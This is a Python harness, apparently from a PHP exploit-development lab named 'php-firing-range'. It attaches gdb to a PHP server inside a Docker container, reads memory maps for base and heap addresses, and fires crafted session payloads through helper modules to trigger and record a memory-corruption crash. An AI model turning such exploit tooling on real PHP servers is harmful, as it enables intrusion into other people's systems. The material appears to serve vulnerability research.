#!/usr/bin/env python3
"""Attach gdb FIRST, then producer + oracle consumer under the same watch."""
import subprocess
import sys
import time

sys.path.insert(0, "/home/user/php-firing-range/scripts")
import smb_q1_fatal_window as q
import smb_619_state as s
import smb_oracle7 as o7
import smb_oracle2 as o2
from smb_oracle import stage, fire_main


def main():
    # fresh main server
    q.docker_exec(q.CT["vuln"], "pkill -f 'php -S 0.0.0.0:8080' || true")
    q.healthy(q.VULN, deadline=15)
    time.sleep(0.5)
    maps = s.get_maps("vuln")
    hrs = s.heap_ranges(maps)
    pid = int(s.helper("vuln", "pid")[0].strip())
    base = int([l for l in maps if "/usr/local/bin/php" in l and "r-xp" in l][0].split("-")[0].split()[0], 16)
    print(f"php pid={pid} base={hex(base)}")
    # attach gdb NOW (before the producer)
    cmd = ["docker", "run", "--rm", "--cap-add", "SYS_PTRACE",
           "--pid=container:" + q.CT["vuln"], "smb-gdb-helper",
           "gdb", "-batch", "-p", str(pid),
           "-ex", "set pagination off", "-ex", "set confirm off",
           "-ex", "set auto-solib-add off",
           "-ex", "handle SIGSEGV stop print nopass",
           "-ex", "continue",
           "-ex", "echo ===CRASH===\\n",
           "-ex", "info registers x0 x1 x2 x9 x19 x20 x21 pc",
           "-ex", "x/6i $pc",
           "-ex", "bt 12",
           "-ex", "detach", "-ex", "quit"]
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    time.sleep(8)  # attach + continue
    # producer
    sid = f"gd{int(time.time())}"
    q.stage_producer("vuln", sid)
    st, _ = q.mp_min(q.VULN, sid)
    print("producer:", st)
    d = o2.find_bg()
    print("d =", hex(d) if d else None)
    if not d:
        proc.kill()
        return 1
    gsid = f"gdc{int(time.time())}"
    stage(gsid, b"k|R:3;")
    first = fire_main(o7.build_body(gsid, d))
    print("consumer:", first)
    rc, out = q.docker_exec(q.CT["vuln"], f"head -c 120 /tmp/sess_{gsid}")
    print("sess:", out[:100])
    try:
        out2, _ = proc.communicate(timeout=90)
    except subprocess.TimeoutExpired:
        proc.kill()
        out2, _ = proc.communicate()
    open("lanes/stealmybitcoin/oracle-cascade.log", "w").write(out2)
    m = out2.find("===CRASH===")
    print(out2[m:m + 1000] if m >= 0 else "(no crash — SURVIVED?)")


if __name__ == "__main__":
    main()
